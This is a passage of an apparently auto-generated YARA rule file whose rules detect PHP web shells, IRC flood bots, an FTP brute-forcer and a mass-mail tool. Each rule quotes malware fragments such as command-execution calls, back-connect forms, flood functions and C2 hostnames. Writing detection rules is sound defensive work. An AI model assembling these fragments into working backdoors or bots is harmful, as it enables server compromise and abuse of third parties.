      $s15 = "    system($_REQUEST['cmd']);" fullword ascii /* score: '7.00'*/
      $s16 = "if(isset($_REQUEST[\"down\"]) && $_REQUEST[\"down\"]!=\"\")" fullword ascii /* score: '7.00'*/
      $s17 = "  closedir($rep);" fullword ascii /* score: '7.00'*/
      $s18 = "  readfile($_REQUEST[\"down\"]);" fullword ascii /* score: '7.00'*/
      $s19 = "  if(isset($_REQUEST['rm']) && $_REQUEST['rm']!=\"\")" fullword ascii /* score: '7.00'*/
      $s20 = "  if(!strncmp($link,\"./\",2) && strlen($link)>2)$link=substr($link,2);" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule backdoor_php_nst_f__65876ca1dde6 {
   meta:
      description = "php__loose__php - file backdoor_php_nst_f__65876ca1dde6"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
   strings:
      $x1 = " [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" ascii /* score: '36.00'*/
      $x2 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '34.00'*/
      $s3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii /* score: '29.00'*/
      $s4 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '28.00'*/
      $s5 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '28.00'*/
      $s6 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii /* score: '27.00'*/
      $s7 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='" ascii /* score: '25.00'*/
      $s8 = "E $str[0] ?\\\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'" ascii /* score: '25.00'*/
      $s9 = "if($_GET['dump_download']){" fullword ascii /* score: '25.00'*/
      $s10 = "DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</" ascii /* score: '25.00'*/
      $s11 = "print \"<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\\\"DE" ascii /* score: '25.00'*/
      $s12 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s13 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s14 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '23.00'*/
      $s15 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s16 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\\\">\";" ascii /* score: '23.00'*/
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s18 = "Display all process - wide output (nst) ps auxw" fullword ascii /* score: '23.00'*/
      $s19 = "# dump table" fullword ascii /* score: '22.00'*/
      $s20 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_nst_e__191d8129e87e {
   meta:
      description = "php__loose__php - file backdoor_php_nst_e__191d8129e87e"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "191d8129e87ea59d8a147802d27b4275f649b99eea5f548e5e8301ab443c3002"
   strings:
      $x1 = " [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" ascii /* score: '36.00'*/
      $x2 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '34.00'*/
      $s3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii /* score: '29.00'*/
      $s4 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '28.00'*/
      $s5 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '28.00'*/
      $s6 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii /* score: '27.00'*/
      $s7 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='" ascii /* score: '25.00'*/
      $s8 = "E $str[0] ?\\\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'" ascii /* score: '25.00'*/
      $s9 = "if($_GET['dump_download']){" fullword ascii /* score: '25.00'*/
      $s10 = "DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</" ascii /* score: '25.00'*/
      $s11 = "print \"<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\\\"DE" ascii /* score: '25.00'*/
      $s12 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s13 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s14 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '23.00'*/
      $s15 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s16 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\\\">\";" ascii /* score: '23.00'*/
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s18 = "Display all process - wide output (nst) ps auxw" fullword ascii /* score: '23.00'*/
      $s19 = "# dump table" fullword ascii /* score: '22.00'*/
      $s20 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_phpshellsic__f52a7f7af829 {
   meta:
      description = "php__loose__php - file backdoor_php_phpshellsic__f52a7f7af829"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "f52a7f7af82909a19757160cc09521a611e229e80175c207a44dc6d06e6629c3"
   strings:
      $x1 = "<!-- PHP SHELL http-based-terminal - DANGEROUS GHOST` -->" fullword ascii /* score: '33.00'*/
      $s2 = "<? echo \"<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana><center>PHPshell.org http-based-terminal v1.0" ascii /* score: '25.00'*/
      $s3 = "print \"<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana color=white><center>:: PHPshell.org http-based-" ascii /* score: '25.00'*/
      $s4 = "print \"<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana color=white><center>:: PHPshell.org http-based-" ascii /* score: '25.00'*/
      $s5 = "<? echo \"<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana><center>PHPshell.org http-based-terminal v1.0" ascii /* score: '25.00'*/
      $s6 = "<b>::Exec command::</b><br>" fullword ascii /* score: '24.00'*/
      $s7 = "<title>PHP SHELL http-based-terminal - <? echo $dir?></title>" fullword ascii /* score: '23.00'*/
      $s8 = "<!-- <form method=post> -->" fullword ascii /* score: '22.00'*/
      $s9 = "############# C++ shell #########" fullword ascii /* score: '20.00'*/
      $s10 = "if($runcmd == \"6\") {passthru(\"cat /usr/local/apache/conf/httpd.conf\");}" fullword ascii /* score: '19.00'*/
      $s11 = "if (($exec == \"\") or ($exec == \"ls -la\")) {print passthru(\"ls -la\");}" fullword ascii /* score: '19.00'*/
      $s12 = "if($runcmd == \"10\") {passthru(\"gcc --help\");}" fullword ascii /* score: '17.00'*/
      $s13 = "<!-- </form> --> </div></td></tr></table>" fullword ascii /* score: '17.00'*/
      $s14 = "if($runcmd == \"9\") {passthru(\"perl --help\");}" fullword ascii /* score: '17.00'*/
      $s15 = "if($runcmd == \"11\") {passthru(\"tar --help\");}" fullword ascii /* score: '17.00'*/
      $s16 = "if($runcmd == \"1\") {passthru(\"find / -type f -perm -04000 -ls\");}" fullword ascii /* score: '17.00'*/
      $s17 = "if($runcmd == \"7\") {passthru(\"ls -la /var/lib/mysql\");}" fullword ascii /* score: '17.00'*/
      $s18 = "<!-- <input type=hidden name=filec value='nst.c'> -->" fullword ascii /* score: '17.00'*/
      $s19 = "if($runcmd == \"8\") {passthru(\"netstat -a\");}" fullword ascii /* score: '17.00'*/
      $s20 = "if($runcmd == \"5\") {passthru(\"cat /etc/httpd/conf/httpd.conf\");}" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_agent_martingeisler__474607cb320f {
   meta:
      description = "php__loose__php - file backdoor_php_agent_martingeisler__474607cb320f"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "474607cb320fdc62a1a3628e9eb8a0313ac399c9fea085b38a8990cecfb63991"
   strings:
      $s1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii /* score: '28.00'*/
      $s2 = "PHP Shell is aninteractive PHP-page that will execute any command" fullword ascii /* score: '25.00'*/
      $s3 = "entered. See the files README and INSTALL or http://www.gimpster.com" fullword ascii /* score: '24.00'*/
      $s4 = "<h1>[YOUR HEADER[ <?php echo PHPSHELL_VERSION ?> [ADITTIONAL TEXT] -" fullword ascii /* score: '21.00'*/
      $s5 = "* PHP Shell *" fullword ascii /* score: '20.00'*/
      $s6 = "document.forms[0].command.focus();" fullword ascii /* score: '19.00'*/
      $s7 = "/* We try and match a cd command. */" fullword ascii /* score: '16.00'*/
      $s8 = "system($command);" fullword ascii /* score: '15.00'*/
      $s9 = "Copyright (C) 2000-2002 Martin Geisler < gimpster@gimpster.com>" fullword ascii /* score: '14.00'*/
      $s10 = "address: http://www.gnu.org/copyleft/gpl.html#SEC1" fullword ascii /* score: '13.00'*/
      $s11 = "phpshell" fullword ascii /* score: '13.00'*/
      $s12 = "extract($HTTP_POST_VARS);" fullword ascii /* score: '12.00'*/
      $s13 = "unset($command);" fullword ascii /* score: '12.00'*/
      $s14 = "extract($HTTP_GET_VARS);" fullword ascii /* score: '12.00'*/
      $s15 = "if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s16 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\">" fullword ascii /* score: '12.00'*/
      $s17 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></title>" fullword ascii /* score: '12.00'*/
      $s18 = "if (!empty($HTTP_GET_VARS))" fullword ascii /* score: '12.00'*/
      $s19 = ", $command, $regs)) {" fullword ascii /* score: '12.00'*/
      $s20 = "PHPSHELL_VERSION" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule backdoor_php_ircbot_obfu_a__932d3e32fb25 {
   meta:
      description = "php__loose__php - file backdoor_php_ircbot_obfu_a__932d3e32fb25"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "932d3e32fb25645b266cdc4a2672bebed1dc50fd1dddfd0376230c9b103cc82e"
   strings:
      $s1 = "if (isset($logged_in[$target_host]) || $irc_params[1] == \"332\") {" fullword ascii /* score: '24.00'*/
      $s2 = "$logged_in[$target_host] = TRUE;" fullword ascii /* score: '24.00'*/
      $s3 = "$logged_in[$target_host] = FALSE;" fullword ascii /* score: '24.00'*/
      $s4 = "$output = @shell_exec($command);" fullword ascii /* score: '22.00'*/
      $s5 = "preg_match(decrypt_settings($settings['ha']), $target_host)) {" fullword ascii /* score: '21.00'*/
      $s6 = "@exec($command, $output);" fullword ascii /* score: '20.00'*/
      $s7 = "$output = trim(fgets($process_handle, 512));" fullword ascii /* score: '20.00'*/
      $s8 = "send_irc_message($socket, $silent, $target, decode(\"RE5TLy8=\"). \" \" . $params[1]. \" -> \" . " fullword ascii /* score: '20.00'*/
      $s9 = "send_irc_message($socket, $silent, $target, decode(\"TWFpbC8v\"). \" Send failure\");" fullword ascii /* score: '19.00'*/
      $s10 = "$target_nick = explode(\"!\", $target_host);" fullword ascii /* score: '19.00'*/
      $s11 = "send_irc_message($socket, $silent, $target, decode(\"U3lzaW5mby8v\"). \" [User: \" . get_current_user(). " fullword ascii /* score: '19.00'*/
      $s12 = "$target_host = $irc_params[0];" fullword ascii /* score: '19.00'*/
      $s13 = "// ieatironx.weedns.com" fullword ascii /* score: '18.00'*/
      $s14 = "// mymusicband.weedns.com" fullword ascii /* score: '18.00'*/
      $s15 = "// myphonenumber.weedns.com" fullword ascii /* score: '18.00'*/
      $s16 = "else if (isset($irc_params[1]) && isset($logged_in[$irc_params[1]])) {" fullword ascii /* score: '17.00'*/
      $s17 = "// Found on Google (http://www.google.com/search?q=%24ra87deb01c5f53&num=20&hl=en&safe=off&filter=0)" fullword ascii /* score: '17.00'*/
      $s18 = "send_irc_message($socket, $silent, $target, decode(\"UFdELy8gQ3VycmVudCBkaXI6\"). \" \" . getcwd());" fullword ascii /* score: '16.00'*/
      $s19 = "write_file($socket, decode(\"UFJJVk1TRw==\"). \" $target :$text\");" fullword ascii /* score: '16.00'*/
      $s20 = "send_irc_message($socket, $silent, $target, decode(\"Q2hvd24vLyBGYWlsZWQgdG8gY2hvd24=\"). " fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule backdoor_php_azrail__7798f90a27cd {
   meta:
      description = "php__loose__php - file backdoor_php_azrail__7798f90a27cd"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "7798f90a27cd7dab3457544a9f08cbb83e1281dba7cd91fa1d2414862b8ee097"
   strings:
      $s1 = "header(\"Content-type: application/force-download\");" fullword ascii /* score: '16.00'*/
      $s2 = "echo \"<center><a href='./$this_file?op=phpinfo' target='_blank'>PHP INFO</a></center>\";" fullword ascii /* score: '14.00'*/
      $s3 = "header(\"Content-Disposition: attachment; filename=$fname\");" fullword ascii /* score: '14.00'*/
      $s4 = "header(\"Content-Length: \".filesize($save));" fullword ascii /* score: '14.00'*/
      $s5 = "T></a> <font face='arial' size='3' color='#808080'> $path/$file</font> - <b>DIR</b> - <a href='./$this_file?op=dd&yol=$path/$fil" ascii /* score: '12.00'*/
      $s6 = "echo \"<div align=right><font face='arial' size='2' color='#C0C0C0'><b> $file</b></font> - <a href='./$this_file?save=$path/$fil" ascii /* score: '12.00'*/
      $s7 = "T></a> <font face='arial' size='3' color='#808080'> $path/$file</font> - <b>DIR</b> - <a href='./$this_file?op=dd&yol=$path/$fil" ascii /* score: '12.00'*/
      $s8 = "echo \"<div align=right><font face='arial' size='2' color='#C0C0C0'><b> $file</b></font> - <a href='./$this_file?save=$path/$fil" ascii /* score: '12.00'*/
      $s9 = "&fname=$file'>indir</a> - <a href='./$this_file?op=edit&fname=$path/$file&dir=$path'>d" fullword ascii /* score: '12.00'*/
      $s10 = "      <font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$REDIRECT_URL</font> <form method=post action=$this_" ascii /* score: '12.00'*/
      $s11 = "e&here=$path'>Sil</a> - \";" fullword ascii /* score: '12.00'*/
      $s12 = "zenle</a> - \";" fullword ascii /* score: '12.00'*/
      $s13 = "      <font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$REDIRECT_URL</font> <form method=post action=$this_" ascii /* score: '12.00'*/
      $s14 = "echo \"<a href='./$this_file?op=del&fname=$path/$file&dir=$path'>sil</a> - <b>$total_kb$total_kb2</b> - \";" fullword ascii /* score: '12.00'*/
      $s15 = "if (file_exists(\"G:\\\\\")){" fullword ascii /* score: '10.00'*/
      $s16 = "if (file_exists(\"H:\\\\\")){" fullword ascii /* score: '10.00'*/
      $s17 = "if(file_exists(\"C:\\\\\")){" fullword ascii /* score: '10.00'*/
      $s18 = "echo \"<center><a href='./$this_file?dir=C:\\\\'>C:\\\\</a></center>\";" fullword ascii /* score: '10.00'*/
      $s19 = " echo \"<center><a href='./$this_file?dir=H:\\\\'>H:\\\\</a></center>\";" fullword ascii /* score: '10.00'*/
      $s20 = "if (file_exists(\"F:\\\\\")){" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule backdoor_php_pbot_g__0f81938e5f98 {
   meta:
      description = "php__loose__php - file backdoor_php_pbot_g__0f81938e5f98"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "0f81938e5f986ba7b82e701f0afd3229b1ba1029a322a3d6a032a42761af1a54"
   strings:
      $s1 = "                               $exec = shell_exec($command); " fullword ascii /* score: '20.00'*/
      $s2 = "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\"); " fullword ascii /* score: '20.00'*/
      $s3 = "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")" ascii /* score: '18.00'*/
      $s4 = "                               $this->privmsg($this->config['chan'],\"[\\2exec\\2]: $command\"); " fullword ascii /* score: '15.00'*/
      $s5 = "var $config = array(\"server\"=>\"irc.chatbr.org\", " fullword ascii /* score: '15.00'*/
      $s6 = " function log_in($host) " fullword ascii /* score: '14.00'*/
      $s7 = " function log_out($host) " fullword ascii /* score: '14.00'*/
      $s8 = " function is_logged_in($host) " fullword ascii /* score: '14.00'*/
      $s9 = "    unset($this->users[$host]); " fullword ascii /* score: '12.00'*/
      $s10 = " var $users = array(); " fullword ascii /* score: '12.00'*/
      $s11 = "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");" fullword ascii /* score: '12.00'*/
      $s12 = "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcm" ascii /* score: '12.00'*/
      $s13 = "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\"); " fullword ascii /* score: '12.00'*/
      $s14 = "    if(isset($this->users[$host])) " fullword ascii /* score: '12.00'*/
      $s15 = " function tcpflood($host,$packets,$packetsize,$port,$delay) " fullword ascii /* score: '12.00'*/
      $s16 = "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcm" ascii /* score: '12.00'*/
      $s17 = "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcm" ascii /* score: '12.00'*/
      $s18 = "    $this->users[$host] = true; " fullword ascii /* score: '12.00'*/
      $s19 = "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcm" ascii /* score: '12.00'*/
      $s20 = "                     \"hostauth\"=>\"*\" // * for any hostname " fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule hacktool_php_bruteforce_c7__4ef871a1ad42 {
   meta:
      description = "php__loose__php - file hacktool_php_bruteforce_c7__4ef871a1ad42"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "4ef871a1ad424d057f71dfa65e883542f2adb0cb253258c1d8e79c3f955e8006"
   strings:
      $x1 = "* This simple FTp brute forcer script is coded by" fullword ascii /* score: '38.00'*/
      $s2 = "openconnection($targethost,$usrname,$trypassword);" fullword ascii /* score: '30.00'*/
      $s3 = "print \"<hr>Trying password <b>$trypassword</b> for <b>\".$username.\"</b> to $targethost<hr><br>\";" fullword ascii /* score: '27.00'*/
      $s4 = "$cc = \"<font color=\\\"red\\\">Sorry, I cannot connect to $targethost with <b>$username</b> and password: $trypassword</font><b" ascii /* score: '27.00'*/
      $s5 = "* This PHP script tries a password " fullword ascii /* score: '26.00'*/
      $s6 = "* Execute it from a webpage on your server, not from" fullword ascii /* score: '26.00'*/
      $s7 = "        function openconnection($targethost,$username,$trypassword) {" fullword ascii /* score: '25.00'*/
      $s8 = "* This bad script probes an FTP dictionary attack" fullword ascii /* score: '23.00'*/
      $s9 = "$targethost = \"www.bahoosh.net\"; //change this to the host you want to attack" fullword ascii /* score: '22.00'*/
      $s10 = "* of the FTP account you desire. And once again," fullword ascii /* score: '20.00'*/
      $s11 = "* from the password file each time intil it finds it." fullword ascii /* score: '20.00'*/
      $s12 = "$trylogin = @ftp_login($ftp_conn,$username,$trypassword);" fullword ascii /* score: '20.00'*/
      $s13 = "* traces if you succeed in cracking the password" fullword ascii /* score: '20.00'*/
      $s14 = "* the command line(!). And remember to clear your" fullword ascii /* score: '20.00'*/
      $s15 = "$ftp_conn = @ftp_connect($targethost) or print $crh;" fullword ascii /* score: '19.00'*/
      $s16 = "$interval = 1; // this is the break the script each time it tries a password" fullword ascii /* score: '18.00'*/
      $s17 = "//get the passwords" fullword ascii /* score: '17.00'*/
      $s18 = "while($trypassword = @fgets($fp,1024)) {" fullword ascii /* score: '17.00'*/
      $s19 = "echo \"<b>The password file has closed\";" fullword ascii /* score: '15.00'*/
      $s20 = "if(!$trylogin) {" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      1 of ($x*) and 4 of them
}

rule spamtool_php_bolajiemailer_a__19b0ed380cb9 {
   meta:
      description = "php__loose__php - file spamtool_php_bolajiemailer_a__19b0ed380cb9"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "19b0ed380cb9297bf942de9aada5040799a375fc74fdaa1c7569bddbda5e30a8"
   strings:
      $s1 = "$contenttype=$_POST['contenttype'];" fullword ascii /* score: '14.00'*/
      $s2 = " \"<script>alert('Mail sending complete\\\\r\\\\n$numemails mail(s) was sent successfully');" fullword ascii /* score: '13.00'*/
      $s3 = "<meta http-equiv=\"Content-Type\" content=\"text/html;" fullword ascii /* score: '12.00'*/
      $s4 = "if(isset($_POST['action']) && $numemails !==0 ){echo" fullword ascii /* score: '12.00'*/
      $s5 = " </script>\";}" fullword ascii /* score: '10.00'*/
      $s6 = "$action=$_POST['action'];" fullword ascii /* score: '9.00'*/
      $s7 = "<form name=\"form1\" method=\"post\" action=\"\"" fullword ascii /* score: '9.00'*/
      $s8 = "$replyto=$_POST['replyto'];" fullword ascii /* score: '9.00'*/
      $s9 = "$subject=$_POST['subject'];" fullword ascii /* score: '9.00'*/
      $s10 = "                $header .= \"Content-Type: text/$contenttype\\r\\n\";" fullword ascii /* score: '9.00'*/
      $s11 = "                $header .= \"Content-Transfer-Encoding: 8bit\\r\\n\\r\\n\";" fullword ascii /* score: '9.00'*/
      $s12 = "$emaillist=$_POST['emaillist'];" fullword ascii /* score: '9.00'*/
      $s13 = "if(isset($_POST['action'] ) ){" fullword ascii /* score: '9.00'*/
      $s14 = "$from=$_POST['from'];" fullword ascii /* score: '9.00'*/
      $s15 = "$file_name=$_POST['file'];" fullword ascii /* score: '9.00'*/
      $s16 = "$realname=$_POST['realname'];" fullword ascii /* score: '9.00'*/
      $s17 = "$message=$_POST['message'];" fullword ascii /* score: '9.00'*/
      $s18 = "  &copy JAMO BIZZ Connection 2007, July.<br>" fullword ascii /* score: '9.00'*/
      $s19 = "                $header .= \"MIME-Version: 1.0\\r\\n\";" fullword ascii /* score: '7.00'*/
      $s20 = "                }" fullword ascii /* reversed goodware string '}                ' */ /* score: '6.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule backdoor_php_w3dshell__801485cbe816 {
   meta:
      description = "php__loose__php - file backdoor_php_w3dshell__801485cbe816"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "801485cbe8165f978bdf8e3d857775047f540dddf97611ebe1558fcd38f875f5"
   strings:
      $s1 = "echo \"<br><font color=#00CC00><b>No Query Executed</b></font>\";" fullword ascii /* score: '18.00'*/
      $s2 = " $con1 = @mysql_connect($host, $username, $password);" fullword ascii /* score: '17.00'*/
      $s3 = "Password: <input type=\"text\" name=\"pass\" />" fullword ascii /* score: '16.00'*/
      $s4 = "www.private-node.net" fullword ascii /* score: '13.00'*/
      $s5 = "<form action=\"w3d.php\" method=\"post\">" fullword ascii /* score: '12.00'*/
      $s6 = " //secondary post-cookie" fullword ascii /* score: '12.00'*/
      $s7 = "<form action=\"w3d.php\" method=\"get\">" fullword ascii /* score: '12.00'*/
      $s8 = "$con = @mysql_connect($host, $user, $pass);" fullword ascii /* score: '12.00'*/
      $s9 = "//secondary post-cookie" fullword ascii /* score: '12.00'*/
      $s10 = "echo '<title>W3D Shell // By: Warpboy \\\\\\ SQL Shell</title>';" fullword ascii /* score: '12.00'*/
      $s11 = "$pass = $_POST['pass'];" fullword ascii /* score: '12.00'*/
      $s12 = "<tr><td bgcolor=#00CC00><center><font size=\"3\" face=\"Verdana\"><b>W3D SQL Shell</font></tr></td>" fullword ascii /* score: '12.00'*/
      $s13 = "$password = $_COOKIE[\"pass\"];" fullword ascii /* score: '12.00'*/
      $s14 = "//Notify user of current connection" fullword ascii /* score: '10.00'*/
      $s15 = "if($_REQUEST['change'] && $user != '') {" fullword ascii /* score: '10.00'*/
      $s16 = "if(!$_REQUEST['change'] && $username != '') {" fullword ascii /* score: '10.00'*/
      $s17 = "$query = $_GET['query'];" fullword ascii /* score: '9.00'*/
      $s18 = "W3D Shell" fullword ascii /* score: '9.00'*/
      $s19 = "//build header" fullword ascii /* score: '9.00'*/
      $s20 = "$dbn = $_POST['db'];" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule backdoor_php_hantushell__1aa328de71a7 {
   meta:
      description = "php__loose__php - file backdoor_php_hantushell__1aa328de71a7"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "1aa328de71a7199a03005b39e9c8e73c2ca6f73e9d55615189cf21690f7cd6f9"
   strings:
      $s1 = "  $login = posix_getuid( );" fullword ascii /* score: '20.00'*/
      $s2 = "</font><FORM name=injection METHOD=POST ACTION=\"<?php echo $_SERVER[\"REQUEST_URI\"];?>\">" fullword ascii /* score: '19.00'*/
      $s3 = "  system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");" fullword ascii /* score: '16.00'*/
      $s4 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>" ascii /* score: '15.00'*/
      $s5 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>" ascii /* score: '15.00'*/
      $s6 = "<font face=\"courier new\" size=\"2\" color=\"777777\"><b>#</b>php injection: <br>" fullword ascii /* score: '14.00'*/
      $s7 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($_POST['cmd'])); ?>\" size=\"161\">" fullword ascii /* score: '14.00'*/
      $s8 = "  $output = ob_get_contents();" fullword ascii /* score: '14.00'*/
